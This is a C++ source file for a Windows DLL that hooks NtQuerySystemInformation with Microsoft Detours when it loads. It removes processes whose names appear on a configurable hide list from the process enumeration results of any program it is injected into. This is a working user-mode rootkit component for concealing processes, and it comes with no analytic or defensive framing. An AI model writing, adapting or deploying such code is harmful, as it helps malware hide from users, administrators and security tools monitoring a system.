#include "pch.h"

// Global list of process names to hide
static std::vector<std::wstring> g_hiddenProcesses;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NtQuerySystemInformation_t origNtQuerySystemInformation = NULL;

// Helper function to check if process should be hidden (case-insensitive)
static bool ShouldHideProcess(const WCHAR* processName) {
    if (processName == NULL || g_hiddenProcesses.empty()) {
        return false;
    }
    
    for (const auto& hiddenProc : g_hiddenProcesses) {
        if (StrStrIW(processName, hiddenProc.c_str()) != NULL) {
            return true;
        }
    }
    
    return false;
}

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
    PVOID SystemInformation, 
    ULONG SystemInformationLength, 
    PULONG ReturnLength) 
{
    NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;

        while (pCurrent != NULL) {
            BOOL isHidden = FALSE;

            if (pCurrent->ImageName.Buffer != NULL &&
                ShouldHideProcess(pCurrent->ImageName.Buffer)) {

                if (pPrevious != NULL) {
                    if (pCurrent->NextEntryOffset == 0) {
                        pPrevious->NextEntryOffset = 0;
                    } else {
                        pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }
                    isHidden = TRUE;
                }
            }

            if (pCurrent->NextEntryOffset == 0) {
                break;
            }

            if (!isHidden) {
                pPrevious = pCurrent;
            }
            
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        }
    }
    return status;
}

// Exported function to add process to hide list
extern "C" __declspec(dllexport) BOOL SetHiddenProcessName(const wchar_t* processName) {
    if (processName == NULL) {
        g_hiddenProcesses.clear();
        return TRUE;
    }
    
    std::wstring procName = processName;
    
    // Check if already in list
    for (const auto& proc : g_hiddenProcesses) {
        if (_wcsicmp(proc.c_str(), procName.c_str()) == 0) {
            return TRUE;
        }
    }
    
    g_hiddenProcesses.push_back(procName);
    return TRUE;
}

// Exported function to get hidden process name (for compatibility)
extern "C" __declspec(dllexport) BOOL GetHiddenProcessName(wchar_t* buffer, DWORD bufferSize) {
    if (buffer == NULL || bufferSize == 0) {
        return FALSE;
    }

    if (g_hiddenProcesses.empty()) {
        buffer[0] = L'\0';
        return TRUE;
    }

    wcsncpy_s(buffer, bufferSize, g_hiddenProcesses[0].c_str(), _TRUNCATE);
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        
        origNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
        
        if (origNtQuerySystemInformation != NULL) {
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourAttach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
            DetourTransactionCommit();
        }
        break;

    case DLL_PROCESS_DETACH:
        if (origNtQuerySystemInformation != NULL) {
            DetourTransactionBegin();
            DetourUpdateThread(GetCurrentThread());
            DetourDetach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
            DetourTransactionCommit();
        }
        break;
    }
    return TRUE;
}